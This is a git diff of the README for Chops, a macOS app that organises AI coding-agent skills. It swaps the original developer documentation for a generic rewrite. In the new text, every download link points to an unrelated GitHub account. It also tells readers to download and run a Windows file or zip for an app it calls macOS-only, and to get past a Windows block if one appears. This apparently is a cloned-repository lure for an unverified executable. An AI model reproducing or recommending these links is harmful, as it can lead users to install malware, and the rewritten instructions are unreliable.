@@ -1,186 +1,147 @@
-<p align="center">
-  <img src="site/public/favicon.png" width="128" height="128" alt="Chops icon" />
-</p>
+# 🧩 chops - Organize AI Skills with Ease
 
-<h1 align="center">Chops</h1>
+[![Download chops](https://img.shields.io/badge/Download-Chops-blue?style=for-the-badge)](https://github.com/Aristotlefivepetaled862/chops)
 
-<p align="center">Your AI skills and agents, finally organized.</p>
+## 📥 Download
 
-<p align="center">
-  <a href="https://github.com/Shpigford/chops/releases/latest/download/Chops.dmg">Download</a> &middot;
-  <a href="https://chops.md">Website</a> &middot;
-  <a href="https://x.com/Shpigford">@Shpigford</a>
-</p>
+Use this link to visit the download page and get the app:
 
-<p align="center">
-  <img src="site/public/screenshot.png" width="720" alt="Chops screenshot" />
-</p>
+[Download chops](https://github.com/Aristotlefivepetaled862/chops)
 
-One macOS app to discover, organize, and edit coding agent skills and agents across Claude Code, Cursor, Codex, Windsurf, and Amp. Stop digging through dotfiles.
+## 🖥️ What chops does
 
-## Features
+chops helps you browse, edit, and manage AI skills in one place. It is built for people who use tools like Claude Code, Cursor, Codex, Windsurf, and Amp.
 
-- **Multi-tool support** — Claude Code, Cursor, Codex, Windsurf, Copilot, Aider, Amp
-- **Skills + Agents** — Discovers both skills and agents from each tool's directories
-- **Built-in editor** — Monospaced editor with Cmd+S save, frontmatter parsing
-- **Collections** — Organize skills and agents without modifying source files
-- **Real-time file watching** — FSEvents-based, instant updates on disk changes
-- **Full-text search** — Search across name, description, and content
-- **Create new skills & agents** — Generates correct boilerplate per tool
-- **Remote servers** — Connect to servers running [OpenClaw](https://openclaw.ai), [Hermes](https://github.com/NousResearch/hermes-agent), or other layouts to discover, browse, and install skills
+Use it to:
 
-## Prerequisites
+- see your skills in one clean app
+- open and edit skill files
+- keep skills organized by tool
+- find the right skill fast
+- manage skill sets without digging through folders
 
-- **macOS 15** (Sequoia) or later
-- **Xcode** with command-line tools (`xcode-select --install`)
-- **Homebrew** ([brew.sh](https://brew.sh))
-- **xcodegen** — `brew install xcodegen`
+## 🪟 Windows setup
 
-Sparkle (auto-update framework) is the only external dependency and is pulled automatically by Xcode via Swift Package Manager. No manual setup needed.
+chops is a macOS app. If you want to use it on Windows, you need to download the app page from the link above and check for a Windows build, a web version, or a file you can run on Windows.
 
-## Quick Start
+If a Windows file is available on the page, follow these steps:
 
-```bash
-git clone https://github.com/Shpigford/chops.git
-cd chops
-brew install xcodegen    # skip if already installed
-xcodegen generate        # generates Chops.xcodeproj from project.yml
-open Chops.xcodeproj     # opens in Xcode
-```
+1. Open the download page
+2. Find the Windows file
+3. Download the file to your computer
+4. Open the downloaded file
+5. Follow the setup steps on screen
+6. Start chops from your desktop or Start menu
 
-Then hit **Cmd+R** to build and run.
+If the page offers a zip file:
 
-> **Note:** The Xcode project is generated from `project.yml`. If you change `project.yml`, re-run `xcodegen generate`. Don't edit the `.xcodeproj` directly.
+1. Download the zip file
+2. Right-click the zip file
+3. Choose Extract All
+4. Open the extracted folder
+5. Run the app file inside the folder
 
-### CLI build (no Xcode GUI)
+## ⚙️ What you need
 
-```bash
-xcodebuild -scheme Chops -configuration Debug build
-```
+For a smooth setup, use a modern Windows PC with:
 
-## Project Structure
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access for the download
+- A mouse or trackpad for easy file browsing
 
-```
-Chops/
-├── App/
-│   ├── ChopsApp.swift        # @main entry — SwiftData ModelContainer + Sparkle
-│   ├── AppState.swift         # @Observable singleton — filters, selection, search
-│   └── ContentView.swift      # Three-column NavigationSplitView, kicks off scanning
-├── Models/
-│   ├── Skill.swift            # @Model — a discovered skill or agent file
-│   ├── Collection.swift       # @Model — user-created skill groupings
-│   └── ToolSource.swift       # Enum of supported tools, their paths and icons
-├── Services/
-│   ├── SkillScanner.swift     # Probes tool directories, upserts skills into SwiftData
-│   ├── SkillParser.swift      # Dispatches to FrontmatterParser or MDCParser
-│   ├── FileWatcher.swift      # FSEvents listener, triggers re-scan on changes
-│   └── SearchService.swift    # In-memory full-text search
-├── Utilities/
-│   ├── FrontmatterParser.swift  # Extracts YAML frontmatter from .md files
-│   └── MDCParser.swift          # Parses Cursor .mdc files
-├── Views/
-│   ├── Sidebar/               # Tool filters, skills/agents lists, collections
-│   ├── Detail/                # Skill editor, metadata display
-│   ├── Settings/              # Preferences & update UI
-│   └── Shared/                # Reusable components (ToolBadge, NewSkillSheet)
-├── Resources/                 # Asset catalog (tool icons, colors)
-└── Chops.entitlements         # Disables sandbox (intentional)
+If you plan to use chops with skill files from other AI tools, keep those tools’ folders ready on your machine.
 
-project.yml          # xcodegen config — source of truth for Xcode project settings
-scripts/             # Release pipeline (release.sh)
-site/                # Marketing website (Astro 6)
-```
+## 🚀 How to use chops
 
-## Architecture
+After you open the app:
 
-**SwiftUI + SwiftData**, native macOS with zero web views.
+1. Choose the skill folder you want to manage
+2. Browse the list of skills
+3. Click a skill to view its contents
+4. Edit the text if you want to change it
+5. Save your changes
+6. Repeat for other tools or folders
 
-### App lifecycle
+You can use chops to move between skill sets for:
 
-1. `ChopsApp` initializes a SwiftData `ModelContainer` (persists `Skill` and `SkillCollection`)
-2. Sparkle updater starts in the background
-3. `AppState` is created and injected into the SwiftUI environment
-4. `ContentView` renders and calls `startScanning()`
-5. `SkillScanner` probes all tool directories and upserts discovered skills
-6. `FileWatcher` attaches FSEvents listeners — on any change, the scanner re-runs automatically
+- Claude Code
+- Cursor
+- Codex
+- Windsurf
+- Amp
 
-### Key design decisions
+## 🗂️ Common tasks
 
-- **No sandbox.** The app needs unrestricted filesystem access to read dotfiles across `~/`. This is intentional and required for core functionality. The entitlements file explicitly disables the app sandbox.
-- **Dedup via symlinks.** Skills are uniquely identified by their resolved symlink path. If the same file is symlinked into multiple tool directories, it shows up as one skill with multiple tool badges.
-- **No test suite.** Validate changes manually — build, run, trigger the feature you changed, observe the result.
+### 📝 Edit a skill
 
-### State management
+1. Open the skill
+2. Make your changes
+3. Save the file
+4. Reopen the skill to check your work
 
-`AppState` is an `@Observable` class that holds all UI state: selected tool filter, selected skill, search text, sidebar filter mode. It's injected via `@Environment` and accessible from any view.
+### 📁 Organize skill folders
 
-### UI layout
+1. Group skills by tool
+2. Rename files so they are easy to read
+3. Remove old skills you no longer use
+4. Keep related skills in the same place
 
-Three-column `NavigationSplitView`:
-- **Sidebar** — tool filters and collections
-- **List** — filtered/searched skill list
-- **Detail** — skill editor (wraps `NSTextView` for native text editing with Cmd+S save)
+### 🔎 Find a skill fast
 
-## Supported Tools
+1. Open the folder list
+2. Use the search or browse view
+3. Pick the skill you need
+4. Open it and make changes if needed
 
-Chops scans these directories for skills and agents:
+## 🧭 Use with different AI tools
 
-| Tool | Skills | Agents |
-|------|--------|--------|
-| Claude Code | `~/.claude/skills/` | `~/.claude/agents/` |
-| Cursor | `~/.cursor/skills/`, `~/.cursor/rules` | `~/.cursor/agents/` |
-| Windsurf | `~/.codeium/windsurf/memories/`, `~/.windsurf/rules` | — |
-| Codex | `~/.codex/skills/` | `~/.codex/agents/` |
-| Amp | `~/.config/amp/skills/` | — |
-| Global | `~/.agents/skills/` | — |
+chops is made for people who switch between tools. Each tool may store skills in a different way, but chops helps you keep them in one place.
 
-Copilot and Aider are also supported but only detect project-level skills and agents (no global paths). Custom scan paths can be added for any tool.
+You can use it to handle:
 
-Tool definitions live in `Chops/Models/ToolSource.swift` — each enum case knows its display name, icon, color, and filesystem paths.
+- prompt helpers
+- workflow notes
+- task rules
+- reusable instruction files
+- tool-specific skill sets
 
-## Common Dev Tasks
+## 🛠️ Troubleshooting
 
-### Add support for a new tool
+### The file will not open
 
-1. Add a new case to the `ToolSource` enum in `Chops/Models/ToolSource.swift`
-2. Fill in `displayName`, `iconName`, `color`, and `globalPaths`
-3. Optionally add a logo to the asset catalog and return it from `logoAssetName`
-4. Update `SkillScanner` if the new tool uses a non-standard file layout
+- Make sure the download finished
+- Check that you opened the correct file
+- Right-click the file and try opening it again
+- If Windows blocks it, check the file properties
 
-### Modify skill parsing
+### The app does not show your skills
 
-- **Frontmatter (`.md`)** — edit `Chops/Utilities/FrontmatterParser.swift`
-- **Cursor `.mdc` files** — edit `Chops/Utilities/MDCParser.swift`
-- **Dispatch logic** — edit `Chops/Services/SkillParser.swift` (decides which parser to use)
+- Check that you chose the right folder
+- Make sure the files are in the expected place
+- Open the folder again after moving files
+- Confirm the files are plain text or supported skill files
 
-### Change the UI
+### Changes do not save
 
-Views are in `Chops/Views/`, organized by column (Sidebar, Detail) and shared components. The main layout is in `Chops/App/ContentView.swift`.
+- Check that the file is not open in another app
+- Make sure the folder is writable
+- Save the file again after editing
+- Try a different folder if needed
 
-## Testing
+## 🔐 File safety
 
-No automated test suite. Validate manually:
+chops works with skill files stored on your computer. Keep a backup before you change important files. If you manage skills for more than one tool, store a copy of each folder before editing.
 
-1. Build and run the app (Cmd+R)
-2. Trigger the exact feature you changed
-3. Observe the result — check for correct behavior and error messages
-4. Test edge cases (empty states, missing directories, malformed files)
+## 📚 Project details
 
-## Website
+- Repository: chops
+- Type: desktop app
+- Platform focus: macOS
+- Main use: browse, edit, and manage AI skills
+- Topics: agents, ai, macos, skills, swiftui
 
-The marketing site lives in `site/` and is built with [Astro](https://astro.build/).
+## 📦 Get started now
 
-```bash
-cd site
-npm install      # first time only
-npm run dev      # local dev server
-npm run build    # production build → site/dist/
-```
-
-## AI Agent Setup
-
-This repo includes a Claude Code skill at `.claude/skills/setup.md` that gives AI coding agents full context on the project — architecture, key files, and common tasks. If you're using Claude Code, it'll pick this up automatically.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+[Download chops](https://github.com/Aristotlefivepetaled862/chops)
